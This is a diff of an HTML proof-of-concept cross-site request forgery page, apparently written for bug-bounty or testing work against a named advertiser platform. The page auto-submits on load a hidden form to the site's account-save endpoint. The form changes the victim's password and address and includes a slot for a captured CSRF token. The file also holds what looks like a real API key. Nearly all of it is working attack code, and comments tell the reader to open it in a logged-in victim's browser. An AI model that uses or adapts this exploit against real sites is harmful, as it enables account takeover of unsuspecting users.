@@ -2,14 +2,15 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>CSRF PoC — no token</title>
+  <title>CSRF PoC — with token</title>
 </head>
 <body onload="document.forms[0].submit()">
   <!--
-    Save this file as csrf_no_token.html and open it in the victim's browser
-    while they are logged into the target site.
+    Replace TOKEN_HERE with the CSRF token value if you captured one.
+    This simulates an attacker who somehow learned the token (or victim reused token).
   -->
   <form method="POST" action="https://advertiser.trafficjunky.com/member/profile/save-account" >
+    <input type="hidden" name="_token" value="TOKEN_HERE">
     <input type="hidden" name="_currentUrl" value="http://advertiser.trafficjunky.com/my-profile-account">
     <input type="hidden" name="old_password" value="">
     <input type="hidden" name="new_password" value="Abc123!test">
@@ -19,7 +20,6 @@
     <input type="hidden" name="address" value="Attacker Address">
     <input type="hidden" name="password" value="">
     <input type="hidden" name="login_alerts" value="1">
-    <!-- api_key or other params from your captured request -->
     <input type="hidden" name="api_key" value="f95cf73f9f8bf62317e2b17566be04ca8f0e856d">
     <noscript>
       <p>JavaScript is disabled — press the button to submit.</p>
